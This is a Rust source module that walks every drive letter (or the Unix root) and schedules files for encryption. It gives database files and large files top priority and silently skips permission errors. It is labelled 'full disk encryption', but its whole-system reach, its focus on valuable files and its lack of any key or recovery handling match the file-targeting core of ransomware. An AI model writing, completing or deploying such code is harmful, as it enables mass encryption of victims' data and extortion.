//! File system traversal and task scheduling logic.

use std::fs;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::Instant;

use crate::crypt::config::Config;
use crate::crypt::scheduler::OptimizedIOScheduler;
use crate::crypt::three_layer_pipeline::ThreeLayerPipeline;
use crate::crypt::utils;

/// Build list of roots to traverse - on Windows this includes all drive letters from C-Z
fn build_roots() -> Vec<String> {
    #[cfg(target_os = "windows")]
    {
        let mut roots = Vec::new();
        // Start from C: to avoid including A: and B: which are typically floppy drives
        for letter in b'C'..=b'Z' {
            let s = format!("{}:\\", letter as char);
            let p = PathBuf::from(&s);
            if p.exists() {
                roots.push(s);
            }
        }
        roots
    }

    #[cfg(not(target_os = "windows"))]
    {
        vec!["/".to_string()]
    }
}

/// Start traversal of filesystem for full disk encryption
pub fn start_traversal(scheduler: OptimizedIOScheduler, config: &Config) {
    println!("Starting file system traversal for full disk encryption...");

    let start_time = Instant::now();
    let file_count = std::sync::Arc::new(std::sync::atomic::AtomicU64::new(0));

    // Always traverse all roots for full disk encryption
    let directories_to_traverse = if config.enable_full_disk_encryption {
        build_roots()
    } else {
        build_roots()
    };

    // Traverse all specified directories
    for dir in &directories_to_traverse {
        if let Err(e) = traverse_directory(&Path::new(dir), &scheduler, config, &file_count) {
            eprintln!("Error traversing directory {}: {}", dir, e);
        }
    }

    println!("File traversal completed");
    let _duration = start_time.elapsed();
}

fn traverse_directory(
    dir: &Path,
    scheduler: &OptimizedIOScheduler,
    config: &Config,
    file_count: &std::sync::Arc<std::sync::atomic::AtomicU64>,
) -> Result<(), String> {
    // println!("Traversing directory: {:?}", dir);

    // 尝试读取目录，如果遇到权限问题则静默跳过
    let mut entries = match fs::read_dir(dir) {
        Ok(entries) => entries,
        Err(e) => {
            // 静默忽略权限错误和其他目录访问错误
            if e.kind() == std::io::ErrorKind::PermissionDenied {
                // println!("Permission denied accessing directory: {:?}, skipping...", dir);
                return Ok(());
            }
            // 对于其他错误仍然返回错误信息
            return Err(format!("Failed to read directory {:?}: {}", dir, e));
        }
    };

    while let Some(entry) = entries.next() {
        let entry = match entry {
            Ok(entry) => entry,
            Err(_) => continue, // 忽略单个条目错误
        };
        let path = entry.path();

        if path.is_file() {
            // When full disk encryption is enabled, we check all files regardless of extension configuration
            // Otherwise, respect extension filter
            let should_encrypt = if config.enable_full_disk_encryption {
                utils::should_encrypt_file_with_config(&path, config)
            } else {
                // Original logic for non-full disk encryption
                utils::should_encrypt_file_with_config(&path, config)
            };

            if should_encrypt {
                let metadata = match entry.metadata() {
                    Ok(metadata) => metadata,
                    Err(_) => continue, // 忽略无法获取元数据的文件
                };

                let file_size = metadata.len();
                let is_database_file = utils::is_database_file(&path);

                // Calculate priority based on file characteristics
                let priority = calculate_priority(file_size, is_database_file);

                // Add file to scheduler
                let file_size_usize = file_size as usize;
                let priority_u32 = priority as u32;

                scheduler.schedule_file(path, file_size_usize, is_database_file, priority_u32);
                file_count.fetch_add(1, std::sync::atomic::Ordering::Relaxed);

                let current_count = file_count.load(std::sync::atomic::Ordering::Relaxed);
                if current_count % 100000 == 0 {
                    println!("Scheduled {} files for encryption", current_count);
                }

                // 当 IO 队列使用率超过 80% 时短暂暂停提交
                let (io_tasks, cpu_tasks) = scheduler.get_task_type_metrics();
                let active_tasks = io_tasks + cpu_tasks;
                let queue_threshold = config.max_concurrent_io * 8 / 10;
                if active_tasks > queue_threshold {
                    if active_tasks > queue_threshold * 95 / 100 {
                        std::thread::sleep(std::time::Duration::from_millis(1));
                    } else {
                        std::hint::spin_loop();
                    }
                }
            }
        } else if path.is_dir() {
            // 统一使用 should_traverse_directory 进行目录过滤
            let should_traverse = utils::should_traverse_directory(&path);

            if should_traverse {
                // Recursively traverse subdirectories
                if let Err(_e) = traverse_directory(&path, scheduler, config, file_count) {
                    // 静默忽略子目录遍历错误，只打印警告信息
                    // eprintln!("Warning: Error traversing subdirectory {:?}: {}", path, e);
                }
            }
        }
    }

    Ok(())
}

fn calculate_priority(file_size: u64, is_database_file: bool) -> i32 {
    // Calculate priority based on file size and type
    let mut priority = 0i32;

    // Higher priority for database files
    if is_database_file {
        priority += 1000;
    }

    // Priority based on file size (larger files get higher priority)
    if file_size > 1024 * 1024 * 1024 {
        // > 1GB
        priority += 100;
    } else if file_size > 100 * 1024 * 1024 {
        // > 100MB
        priority += 50;
    } else if file_size > 10 * 1024 * 1024 {
        // > 10MB
        priority += 10;
    } else if file_size > 1024 * 1024 {
        // > 1MB
        priority += 5;
    }

    priority
}

pub fn start_traversal_three_layer(pipeline: &ThreeLayerPipeline, config: &Config) {
    println!("Starting file system traversal for three-layer pipeline encryption...");

    let start_time = Instant::now();

    let directories_to_traverse = if let Some(ref path) = config.only_encrypt_path {
        vec![path.clone()]
    } else {
        build_roots()
    };

    for dir in &directories_to_traverse {
        println!("Adding directory to traversal: {}", dir);
        if let Err(e) = pipeline.add_directory(Path::new(dir)) {
            eprintln!("Failed to add directory to pipeline: {}", e);
        }
    }

    println!("All directories added to traversal");
    let _duration = start_time.elapsed();
}
